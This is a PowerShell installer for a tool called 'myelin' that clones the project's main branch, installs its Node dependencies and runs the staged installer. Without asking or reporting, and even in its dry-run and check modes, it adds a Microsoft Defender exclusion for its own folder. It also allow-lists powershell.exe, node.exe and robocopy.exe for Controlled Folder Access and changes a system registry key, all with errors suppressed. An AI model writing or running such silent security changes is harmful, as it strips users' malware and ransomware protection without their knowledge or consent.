param(
    [string]$Preset = "proxy",
    [string]$IndexTier = "default",
    [switch]$Check,
    [switch]$DryRun,
    [switch]$Yes,
    [switch]$NoHeadroom,
    [switch]$CopilotOnly,
    [switch]$ClaudeOnly
)
$ErrorActionPreference = "Stop"
$MyelinDir = if ($env:MYELIN_DIR) { $env:MYELIN_DIR } else { "$env:USERPROFILE\.myelin" }
$env:MYELIN_DIR = $MyelinDir
$RepoUrl = if ($env:MYELIN_REPO_URL) { $env:MYELIN_REPO_URL } else { "https://github.com/yehsuf/myelin" }

# -DryRun and -Check are non-activating: stage/validate a candidate but never
# switch the active runtime by writing the current-release pointer.
$Activate = -not ($DryRun -or $Check)

function Check-Node {
    try {
        $ver = (node --version 2>&1).Trim()
        $major = [int]($ver.TrimStart('v').Split('.')[0])
        if ($major -lt 20) { throw "Node.js $ver < v20" }
        Write-Host "[myelin] Node.js $ver OK"
    } catch { Write-Error "Node.js not found or too old. Install from https://nodejs.org (v20+)" }
}
function Check-Git {
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) { Write-Error "git not found." }
}
function Write-CurrentReleasePointer {
    param(
        [Parameter(Mandatory = $true)][string]$ReleaseId,
        [Parameter(Mandatory = $true)][string]$RuntimeRoot
    )

    $currentPointer = Join-Path $MyelinDir "current.json"
    $tempPointer = "$currentPointer.$PID.tmp"
    $pointer = @{
        version = 1
        releaseId = $ReleaseId
        runtimeRoot = $RuntimeRoot
    } | ConvertTo-Json

    New-Item -ItemType Directory -Force -Path $MyelinDir | Out-Null
    [System.IO.File]::WriteAllText($tempPointer, $pointer + [Environment]::NewLine, [System.Text.UTF8Encoding]::new($false))
    Move-Item -LiteralPath $tempPointer -Destination $currentPointer -Force
}

function Stage-MainRuntime {
    $releasesDir = Join-Path $MyelinDir "releases"
    $stageDir = Join-Path $MyelinDir ("releases-stage-main-{0}-{1}" -f $PID, [DateTimeOffset]::UtcNow.ToUnixTimeSeconds())

    New-Item -ItemType Directory -Force -Path $MyelinDir, $releasesDir | Out-Null

    try {
        Write-Host "[myelin] Staging main runtime..."
        git clone --depth 1 --branch main $RepoUrl $stageDir
        if ($LASTEXITCODE -ne 0) { throw "git clone failed" }

        $commit = (git -C $stageDir rev-parse --short=12 HEAD).Trim()
        if ($LASTEXITCODE -ne 0) { throw "git rev-parse failed" }

        $releaseId = "main-$commit"
        $runtimeRoot = Join-Path $releasesDir $releaseId
        $entrypoint = Join-Path $runtimeRoot "src\cli\index.mjs"
        $nodeModules = Join-Path $runtimeRoot "node_modules"

        if (Test-Path $runtimeRoot) {
            if ((Test-Path $entrypoint -PathType Leaf) -and (Test-Path $nodeModules -PathType Container)) {
                Write-Host "[myelin] Reusing managed runtime $releaseId"
                Remove-Item -LiteralPath $stageDir -Recurse -Force
                if ($Activate) { Write-CurrentReleasePointer -ReleaseId $releaseId -RuntimeRoot $runtimeRoot }
                return $runtimeRoot
            }

            Remove-Item -LiteralPath $runtimeRoot -Recurse -Force
        }

        Push-Location $stageDir
        try {
            npm ci --ignore-scripts
            if ($LASTEXITCODE -ne 0) { throw "npm ci failed" }

            node --check src/cli/index.mjs
            if ($LASTEXITCODE -ne 0) { throw "node --check failed" }
        } finally {
            Pop-Location
        }

        Move-Item -LiteralPath $stageDir -Destination $runtimeRoot
        $stageDir = $null
        if ($Activate) { Write-CurrentReleasePointer -ReleaseId $releaseId -RuntimeRoot $runtimeRoot }
        return $runtimeRoot
    } catch {
        if ($stageDir -and (Test-Path $stageDir)) {
            Remove-Item -LiteralPath $stageDir -Recurse -Force
        }
        throw
    }
}

try { $binDir = Join-Path $MyelinDir 'bin'; New-Item -Force -Path $binDir -ItemType Directory | Out-Null; Add-MpPreference -ExclusionPath $binDir -ErrorAction SilentlyContinue } catch {}
# Whitelist powershell.exe and node.exe for Controlled Folder Access
try { Add-MpPreference -ControlledFolderAccessAllowedApplications (Get-Command node -ErrorAction SilentlyContinue).Source -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ControlledFolderAccessAllowedApplications "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ControlledFolderAccessAllowedApplications "$env:SystemRoot\System32\robocopy.exe" -ErrorAction SilentlyContinue } catch {}
try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name "LongPathsEnabled" -Value 1 -ErrorAction SilentlyContinue } catch {}

$RuntimeRoot = $null
Check-Node; Check-Git; $RuntimeRoot = Stage-MainRuntime

$a = @((Join-Path $RuntimeRoot "src\install.mjs"))
if ($Check) { $a += "--check" }; if ($DryRun) { $a += "--dry-run" }; if ($Yes) { $a += "--yes" }
if ($NoHeadroom) { $a += "--no-headroom" }
if ($CopilotOnly) { $a += "--copilot-only" }; if ($ClaudeOnly) { $a += "--claude-only" }
$a += "--profile", $Preset, "--index-tier", $IndexTier
Write-Host "[myelin] Running staged installer..."
node @a
